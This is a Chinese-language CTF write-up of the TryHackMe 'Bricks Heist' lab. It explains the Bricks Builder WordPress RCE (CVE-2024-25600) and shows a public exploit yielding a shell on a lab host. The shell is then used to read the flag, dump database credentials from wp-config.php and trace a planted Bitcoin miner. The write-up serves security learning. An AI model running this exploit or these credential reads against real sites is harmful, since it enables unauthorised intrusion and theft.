---
icon: pen-to-square
date: 2025-04-30
tags: 
title: TryHack3M_Bricks Heist
category:
  - 项目
---
## 前言
本题运用了wordpress漏洞[**_CVE-2024-25600_**](https://medium.com/@chinamayjoshi/unauthenticated-remote-code-execution-rce-vulnerability-in-bricks-builder-for-wordpress-a12132c91cc1)
我们可以提前配置wordscan，WPScan 是一款针对 WordPress 的安全扫描工具，用于检测插件、主题漏洞、用户枚举及配置问题。

### 漏洞原理
Bricks <= 1.9.6版本，漏洞为远程代码执行 （RCE），
漏洞存在于Bricks\Query类中，Bricks\Query 类用于管理 WordPress 帖子查询的渲染。
在`Bricks\Query` 类包含的方法`prepare_query_vars_from_settings`中第十行存在eval函数，会处理`$php_query_raw`参数
```php
$user_result = eval( $php_query_raw ); // Execute the user code
```
接下来需要我们找到一种方法来传入`$php_query_raw`参数
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250503124903.png)
发现在多处都实例化了`Bricks\Query`类

在`Bricks\Ajax::render_element($element)`处的实例化尤为显眼
Bricks 使用这个方法来显示编辑器内块/元素的预览。

实例代码：
```php
if ( ! empty( $loop_element ) ) 
	{ $query = new Query( $loop_element ); // CUT FOR BREVITY 
	}
```
该方法可通过`admin-ajax.php` 端点和 `WordPress Rest API` 调用。

以上方方法调用的权限检测如下
```php
if ( bricks_is_ajax_call() && isset( $_POST ) ) {
    self::verify_request();
}

elseif ( bricks_is_rest_call() ) {
    // REST API (Permissions checked in the API->render_element_permissions_check())
}
```
`bricks_is_ajax_call()`分支中会调用`Ajax::verify_request()`，检查当前用户是否有权访问 Bricks 构建器
但是，如果此方法是通过 REST API 调用的，则不会调用`Ajax::verify_request()`。
因为REST API会进行回调检查，
关于`render_element`调用的路由表(注册路径)
```php
// Server-side render (SSR) for builder elements via window.fetch API requests
		register_rest_route(
			self::API_NAMESPACE,
			'render_element',
			[
				'methods'             => 'POST',
				'callback'            => [ $this, 'render_element' ],
				'permission_callback' => [ $this, 'render_element_permissions_check' ],
			]
		); 

```

但在`render_element_permission_check`方法中没有执行任何权限检查，代码略
该方法仅检查请求是否包含有效的`nonce`，`nonce`只能防止重放攻击，并不能进行权限检查


## 解题过程
先用wpscan 扫描一下目标服务器，
```bash
wpscan --url https://bricks.thm/
```
发现存在bricks 且版本为1.9.5，刚好对应了此前的漏洞
于是搜索漏洞会发现许多github项目的exploit，例如
[Chocapikk/CVE-2024-25600：未经身份验证的远程代码执行 – Bricks <= 1.9.6](https://github.com/Chocapikk/CVE-2024-25600)

现在，运行漏洞利用

```shell
C:\Users\l1709\Desktop\work\CVE-2024-25600-main>python exploit.py -u https://10.10.73.131
[*] Nonce found: 4982bac29f
[+] https://10.10.73.131 is vulnerable to CVE-2024-25600. Command output: apache
[!] Shell is ready, please type your commands UwU
```

```bash
# ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
```

获得隐藏的txt文件
```bash
# cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```

```bash
# cat wp-config.php | grep DB_
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'root' );
define( 'DB_PASSWORD', 'lamp.sh' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );
```

```
systemctl list-units --type=service --state=running
```

用于列出当前系统中 ​**​所有正在运行的系统服务（Services）​**​。这是 Systemd 服务管理器的核心命令，可帮助管理员监控系统状态。

可以发现可疑的服务
```bash
ubuntu.service                                 loaded active running TRYHACK3M     
```

继续输入
```bash
systemctl cat ubuntu.service
```
**查看 systemd 服务的完整配置文件内容​**，自动定位服务配置文件的存储位置，无需手动搜索。
```bash
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```
可疑的服务名称为
`nm-inet-dialog`

来到可以的目录下
```
# dir /lib/NetworkManager
VPN             nm-dispatcher           nm-openvpn-service
conf.d          nm-iface-helper         nm-openvpn-service-openvpn-helper
dispatcher.d    nm-inet-dialog          nm-pptp-auth-dialog
inet.conf       nm-initrd-generator     nm-pptp-service
nm-dhcp-helper  nm-openvpn-auth-dialog  system-connections
```
这个命令有点奇怪，四不像,但是不可以使用cd命令

经过搜索查看，最终发现inet.conf的文件十分可疑
```bash
# cat  /lib/NetworkManager/inet.conf | less
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
2024-04-08 10:46:18,755 [*] Miner()
2024-04-08 10:46:20,757 [*] Miner()
```
疑似比特币挖矿程序。
对ID进行解码[From Hex, From Base64, From Base64 - CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex\('None'\)From_Base64\('A-Za-z0-9%2B/%3D',true,false\)From_Base64\('A-Za-z0-9%2B/%3D',true,false\)&input=NTc1NzMxNGU2NTQ3NGU1OTYyNDg0YTRmNjU2ZDc4NzQ1NzU0NGU0MjRlNTc0NjQ4NTU1NDQ2Njg0ZDMwNzA3MzU5MzA2ODRiNjE2YzcwNTU1YTdhNTY2YjUyMzM1Mjc2NTQ2YjY4NmI2NTU3NTI0ODY0N2E1MjVhNTc0NjZmNzc1NDZiNjQzMzRkNmIzNDdhNTI2ZDY4NWE2MjU1MzEzNDU5MzE2ODczNjM2YjM1MzY2MjQ3MzE1YTRkMzA0NTMxNTk1NTY0NDc2MTMwMzU1ODY0NDg2YzYxNTc0NTRhMzU1NzU0NGE1NjRlNDUzOTU5NTU2ZTRhNjg1MjQ2NDk3YTU5MzIzNTUzNjMzMDM5NDg1MjZhNGE2YjUyNDY0YTdhNTQ2ZDcwNmI2NTQ2NmM1MjUwNTQzMDNk)
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250504115516.png)
以上地址存在重复部分，选取一部分进行比特币地址检索,[BTC地址bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa | CoinEx多币种区块浏览器](https://explorer.coinex.com/btc/address/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa)
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250504115700.png)
直接搜索地址`bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r`
发现新闻报道，属于名为lockbit的勒索组织。

